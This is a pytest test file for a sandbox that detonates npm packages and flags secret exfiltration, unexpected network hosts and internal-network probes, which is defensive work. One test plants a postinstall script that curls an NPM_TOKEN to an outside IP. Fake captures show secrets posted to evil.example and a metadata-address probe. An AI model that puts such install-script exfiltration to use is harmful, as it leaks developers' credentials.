
import json
import subprocess
from pathlib import Path

import pytest

from malwhunter.chamber import runner
from malwhunter.chamber.runner import (
    DetonationUnavailable,
    _build_docker_command,
    _docker_available,
    _read_capture,
    _signals_from_capture,
    detonate_package,
)
from malwhunter.wiretap.proxy import CapturedBlocked, CapturedConnect, CapturedHttpRequest

requires_docker = pytest.mark.skipif(not _docker_available(), reason="Docker not available in this environment")


def test_no_lifecycle_scripts_short_circuits_without_checking_docker(tmp_path, monkeypatch):
    def fail_if_called():
        raise AssertionError("docker availability should never be checked when there's nothing to run")

    monkeypatch.setattr("malwhunter.chamber.runner._docker_available", fail_if_called)

    signals = detonate_package("benign-pkg", "1.0.0", tmp_path, {"name": "benign-pkg"})
    assert signals == []


def test_raises_detonation_unavailable_when_docker_missing(tmp_path, monkeypatch):
    monkeypatch.setattr("malwhunter.chamber.runner._docker_available", lambda: False)

    package_json = {"name": "x", "scripts": {"postinstall": "echo hi"}}
    with pytest.raises(DetonationUnavailable):
        detonate_package("x", "1.0.0", tmp_path, package_json)


class _FakeProxy:
    def __init__(self, http_requests, connects, blocked=()):
        self.http_requests = http_requests
        self.connects = connects
        self.blocked = list(blocked)


def test_signals_from_capture_flags_canary_leak_over_plain_http():
    # A canary leaked to a host that's ALSO unrecognized is legitimately
    # two separate true findings — canary-exfiltration (the stronger,
    # near-zero-false-positive one) and unexpected-network-destination
    # (the host itself isn't on the allow-list either). Both are real;
    # neither should be suppressed in favor of the other.
    canaries = {"NPM_TOKEN": "canary_deadbeef"}
    proxy = _FakeProxy(
        http_requests=[
            CapturedHttpRequest(
                method="POST", url="/collect", host="evil.example", headers={}, body=b"t=canary_deadbeef"
            )
        ],
        connects=[],
    )
    signals = _signals_from_capture("x", proxy, canaries)
    categories = {s.category for s in signals}
    assert categories == {"canary-exfiltration", "unexpected-network-destination"}
    canary_signal = next(s for s in signals if s.category == "canary-exfiltration")
    assert canary_signal.severity.value == "critical"


def test_signals_from_capture_ignores_allowed_https_hosts():
    proxy = _FakeProxy(http_requests=[], connects=[CapturedConnect(host="registry.npmjs.org", port=443)])
    signals = _signals_from_capture("x", proxy, {})
    assert signals == []


def test_signals_from_capture_flags_plain_http_dropper_to_unrecognized_host():
    # The exact real-world shape found by live-testing Detonation: a
    # `curl | sh` postinstall dropper over plain HTTP, no canary
    # involved at all — must still be caught, not just the HTTPS/CONNECT
    # path and not just canary-leak detection.
    proxy = _FakeProxy(
        http_requests=[
            CapturedHttpRequest(method="GET", url="/setup.sh", host="198.51.100.7", headers={}, body=b"")
        ],
        connects=[],
    )
    signals = _signals_from_capture("x", proxy, {})
    assert len(signals) == 1
    assert signals[0].category == "unexpected-network-destination"
    assert signals[0].severity.value == "medium"


def test_signals_from_capture_ignores_plain_http_to_allowed_host():
    proxy = _FakeProxy(
        http_requests=[
            CapturedHttpRequest(method="GET", url="/pkg", host="registry.npmjs.org:80", headers={}, body=b"")
        ],
        connects=[],
    )
    signals = _signals_from_capture("x", proxy, {})
    assert signals == []


def test_signals_from_capture_flags_unrecognized_https_host():
    proxy = _FakeProxy(http_requests=[], connects=[CapturedConnect(host="c2.evil.example", port=443)])
    signals = _signals_from_capture("x", proxy, {})
    assert len(signals) == 1
    assert signals[0].category == "unexpected-network-destination"
    assert signals[0].severity.value == "medium"


def test_signals_from_capture_clean_when_nothing_observed():
    proxy = _FakeProxy(http_requests=[], connects=[])
    assert _signals_from_capture("x", proxy, {}) == []


@requires_docker
def test_detonate_package_catches_real_canary_exfiltration_end_to_end(tmp_path):
    # The one test in this file that isn't mocked at any layer: a real
    # Docker container actually runs a real postinstall script that
    # actually curls a planted canary secret to an unrecognized host,
    # and the real WiretapProxy on the host actually captures it. This
    # is what proves the full container -> proxy -> canary chain works,
    # not just that the signal-classification logic is correct in
    # isolation (see the _FakeProxy-based tests above for that).
    package_dir = tmp_path / "real-detonation-test"
    package_dir.mkdir()
    package_json = {
        "name": "real-detonation-test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl -s 'http://203.0.113.5/collect?data='$NPM_TOKEN || true",
        },
    }
    (package_dir / "package.json").write_text(json.dumps(package_json))

    signals = detonate_package("real-detonation-test", "1.0.0", package_dir, package_json)

    categories = {s.category for s in signals}
    assert "canary-exfiltration" in categories
    canary_signal = next(s for s in signals if s.category == "canary-exfiltration")
    assert canary_signal.severity.value == "critical"


def test_signals_from_capture_flags_refused_internal_destination_as_high():
    proxy = _FakeProxy(
        http_requests=[],
        connects=[CapturedConnect(host="169.254.169.254", port=80)],
        blocked=[CapturedBlocked(host="169.254.169.254", port=80, address="169.254.169.254")],
    )
    signals = _signals_from_capture("x", proxy, {})
    probe = next(s for s in signals if s.category == "internal-network-probe")
    assert probe.severity.value == "high"
    assert "169.254.169.254:80" in probe.description


def _docker_cmd(**overrides):
    kwargs = dict(
        scratch_path="/tmp/scratch/pkg",
        canaries={"NPM_TOKEN": "canary_x"},
        script_chain="(node install.js)",
        network="malwhunter-net-abc",
        container_name="malwhunter-chamber-abc",
    )
    kwargs.update(overrides)
    return _build_docker_command(
        kwargs.pop("scratch_path"), kwargs.pop("canaries"), kwargs.pop("script_chain"), **kwargs
    )


def _flag_value(cmd, flag):
    return cmd[cmd.index(flag) + 1]


def test_docker_command_attaches_only_the_isolated_sandbox_network():
    # HTTP_PROXY is advisory — Node's http/https/fetch, raw sockets and
    # DNS all ignore it. The network itself has to be the boundary.
    cmd = _docker_cmd()
    assert _flag_value(cmd, "--network") == "malwhunter-net-abc"
    assert cmd.count("--network") == 1
    assert not any("host-gateway" in arg or "host.docker.internal" in arg for arg in cmd)
    assert "HTTP_PROXY=http://wiretap:8080" in cmd
    assert "http_proxy=http://wiretap:8080" in cmd


def test_docker_command_names_container_and_drops_root():
    cmd = _docker_cmd()
    assert _flag_value(cmd, "--name") == "malwhunter-chamber-abc"
    assert _flag_value(cmd, "--user") == "node"
    assert "HOME=/tmp" in cmd
    # every flag must come before the image name, or docker treats it as the command
    assert cmd.index("--user") < cmd.index(runner.CONTAINER_IMAGE)


@pytest.fixture
def fake_docker(monkeypatch):
    """Stands in for every docker CLI call detonate_package makes, and
    records them in order, so orchestration (network layout, proxy
    container, cleanup) is testable without a Docker daemon."""
    calls = []
    state = {
        "fail": None,           # e.g. ("network", "create") -> that call returns rc=1
        "gateway": "",          # isolated mode: no host gateway address
        "run_raises": None,
        "proxy_events": [],     # JSON lines the fake Wiretap container "captures"
        "proxy_ready": True,
    }

    def fake_docker_call(*args, timeout=15):
        calls.append(args)
        if state["fail"] and args[: len(state["fail"])] == state["fail"]:
            return subprocess.CompletedProcess(args, 1, b"", b"boom")
        if args[:2] == ("network", "inspect"):
            return subprocess.CompletedProcess(args, 0, state["gateway"].encode(), b"")
        if args[:2] == ("run", "-d"):
            out_dir = _flag_value(list(args), "-v").split(":")[0]
            if state["proxy_ready"]:
                (Path(out_dir) / "ready").write_text("ready")
            (Path(out_dir) / "capture.jsonl").write_text("".join(json.dumps(e) + "\n" for e in state["proxy_events"]))
        return subprocess.CompletedProcess(args, 0, b"", b"")

    def fake_run(cmd, **kwargs):
        calls.append(tuple(cmd))
        if state["run_raises"] is not None:
            raise state["run_raises"]
        return subprocess.CompletedProcess(cmd, 0, b"", b"")

    monkeypatch.setattr(runner, "_docker_available", lambda: True)
    monkeypatch.setattr(runner, "_ensure_images", lambda: None)
    monkeypatch.setattr(runner, "_docker", fake_docker_call)
    monkeypatch.setattr(runner.subprocess, "run", fake_run)
    monkeypatch.setattr(runner, "WIRETAP_READY_TIMEOUT_SECONDS", 0.3)
    state["calls"] = calls
    return state


def _package(tmp_path):
    package_dir = tmp_path / "pkg"
    package_dir.mkdir()
    (package_dir / "index.js").write_text("// hi")
    return package_dir, {"name": "x", "scripts": {"postinstall": "node index.js"}}


def _sandbox_run(calls):
    return list(next(c for c in calls if c[0] == "docker"))


def _verb(call):
    return ("docker", "run") if call[0] == "docker" else call[:2]


def test_sandbox_network_is_internal_and_gateway_isolated(tmp_path, fake_docker):
    package_dir, package_json = _package(tmp_path)
    detonate_package("x", "1.0.0", package_dir, package_json)

    creates = [c for c in fake_docker["calls"] if c[:2] == ("network", "create")]
    sandbox_create, egress_create = creates
    assert "--internal" in sandbox_create
    assert "com.docker.network.bridge.gateway_mode_ipv4=isolated" in sandbox_create
    assert "--internal" not in egress_create  # only the proxy's network reaches the internet

    sandbox_net = sandbox_create[-1]
    assert _flag_value(_sandbox_run(fake_docker["calls"]), "--network") == sandbox_net


def test_proxy_container_bridges_egress_and_sandbox_networks(tmp_path, fake_docker):
    package_dir, package_json = _package(tmp_path)
    detonate_package("x", "1.0.0", package_dir, package_json)

    sandbox_net, egress_net = [c[-1] for c in fake_docker["calls"] if c[:2] == ("network", "create")]
    proxy_run = next(c for c in fake_docker["calls"] if c[:2] == ("run", "-d"))
    assert _flag_value(list(proxy_run), "--network") == egress_net
    assert runner.WIRETAP_IMAGE in proxy_run
    assert "--read-only" in proxy_run and "--cap-drop=ALL" in proxy_run
    proxy_name = _flag_value(list(proxy_run), "--name")
    assert ("network", "connect", "--alias", "wiretap", sandbox_net, proxy_name) in fake_docker["calls"]
    # proxy is attached before the package ever runs
    verbs = [_verb(c) for c in fake_docker["calls"]]
    assert verbs.index(("network", "connect")) < verbs.index(("docker", "run"))


def test_refuses_to_detonate_when_docker_leaves_a_host_gateway_on_the_sandbox_network(tmp_path, fake_docker):
    # an older daemon that accepts but ignores gateway_mode=isolated
    fake_docker["gateway"] = "172.30.0.1 "
    package_dir, package_json = _package(tmp_path)

    with pytest.raises(DetonationUnavailable, match="isolated gateway mode"):
        detonate_package("x", "1.0.0", package_dir, package_json)
    assert not any(c[0] == "docker" for c in fake_docker["calls"])
    assert ("network", "rm") in [c[:2] for c in fake_docker["calls"]]


def test_capture_from_the_proxy_container_becomes_signals(tmp_path, fake_docker):
    import base64

    fake_docker["proxy_events"] = [
        {"kind": "http", "method": "POST", "url": "http://evil.example/c", "host": "evil.example",
         "headers": {}, "body": base64.b64encode(b"t=SECRET").decode()},
        {"kind": "connect", "host": "c2.evil.example", "port": 443},
        {"kind": "blocked", "host": "localhost", "port": 5432, "address": "127.0.0.1"},
    ]
    package_dir, package_json = _package(tmp_path)
    signals = detonate_package("x", "1.0.0", package_dir, package_json)
    assert {s.category for s in signals} == {"unexpected-network-destination", "internal-network-probe"}


def test_cleanup_order_sandbox_then_proxy_then_networks(tmp_path, fake_docker):
    package_dir, package_json = _package(tmp_path)
    detonate_package("x", "1.0.0", package_dir, package_json)

    calls = fake_docker["calls"]
    sandbox_name = _flag_value(_sandbox_run(calls), "--name")
    proxy_name = _flag_value(list(next(c for c in calls if c[:2] == ("run", "-d"))), "--name")
    removals = [c for c in calls if c[:2] in (("rm", "-f"), ("network", "rm"))]
    assert removals[0] == ("rm", "-f", sandbox_name)
    assert removals[1] == ("rm", "-f", proxy_name)
    # docker refuses to remove a network with a container still attached
    assert [c[:2] for c in removals[2:]] == [("network", "rm"), ("network", "rm")]


def test_timeout_force_removes_the_container_not_just_the_docker_client(tmp_path, fake_docker):
    # subprocess.run(timeout=...) only kills the local `docker` client —
    # the container keeps running on its own unless explicitly removed.
    fake_docker["run_raises"] = subprocess.TimeoutExpired(cmd="docker run", timeout=30)
    package_dir, package_json = _package(tmp_path)

    detonate_package("x", "1.0.0", package_dir, package_json)

    container_name = _flag_value(_sandbox_run(fake_docker["calls"]), "--name")
    assert ("rm", "-f", container_name) in fake_docker["calls"]


def test_unexpected_error_mid_run_still_cleans_up_everything(tmp_path, fake_docker):
    fake_docker["run_raises"] = KeyboardInterrupt()
    package_dir, package_json = _package(tmp_path)

    with pytest.raises(KeyboardInterrupt):
        detonate_package("x", "1.0.0", package_dir, package_json)

    verbs = [_verb(c) for c in fake_docker["calls"]]
    assert verbs.count(("rm", "-f")) == 2
    assert verbs[-2:] == [("network", "rm"), ("network", "rm")]


@pytest.mark.parametrize("failing", [("network", "create"), ("run", "-d"), ("network", "connect")])
def test_setup_failures_are_detonation_unavailable_and_run_nothing(tmp_path, fake_docker, failing):
    fake_docker["fail"] = failing
    package_dir, package_json = _package(tmp_path)

    with pytest.raises(DetonationUnavailable):
        detonate_package("x", "1.0.0", package_dir, package_json)
    assert not any(c[0] == "docker" for c in fake_docker["calls"])


def test_proxy_that_never_becomes_ready_is_detonation_unavailable_and_cleaned_up(tmp_path, fake_docker):
    fake_docker["proxy_ready"] = False
    package_dir, package_json = _package(tmp_path)

    with pytest.raises(DetonationUnavailable, match="didn't become ready"):
        detonate_package("x", "1.0.0", package_dir, package_json)
    verbs = [_verb(c) for c in fake_docker["calls"]]
    assert ("docker", "run") not in verbs
    assert ("rm", "-f") in verbs and verbs[-1] == ("network", "rm")


def test_read_capture_skips_a_line_cut_short_by_a_kill(tmp_path):
    log = tmp_path / "capture.jsonl"
    log.write_text('{"kind": "connect", "host": "a.example", "port": 443}\n{"kind": "conn')
    capture = _read_capture(log)
    assert [(c.host, c.port) for c in capture.connects] == [("a.example", 443)]


def test_scratch_copy_is_writable_by_the_unprivileged_sandbox_user(tmp_path, fake_docker):
    package_dir, package_json = _package(tmp_path)
    (package_dir / "lib").mkdir()
    (package_dir / "lib" / "run.sh").write_text("#!/bin/sh")
    (package_dir / "lib" / "run.sh").chmod(0o700)
    seen_modes = {}

    def capture_modes(cmd, **kwargs):
        import os

        scratch = _flag_value(cmd, "-v").split(":")[0]
        seen_modes["dir"] = os.stat(scratch).st_mode & 0o777
        seen_modes["exe"] = os.stat(f"{scratch}/lib/run.sh").st_mode & 0o777
        return subprocess.CompletedProcess(cmd, 0, b"", b"")

    runner.subprocess.run = capture_modes  # monkeypatch fixture restores the original
    detonate_package("x", "1.0.0", package_dir, package_json)

    assert seen_modes == {"dir": 0o777, "exe": 0o777}
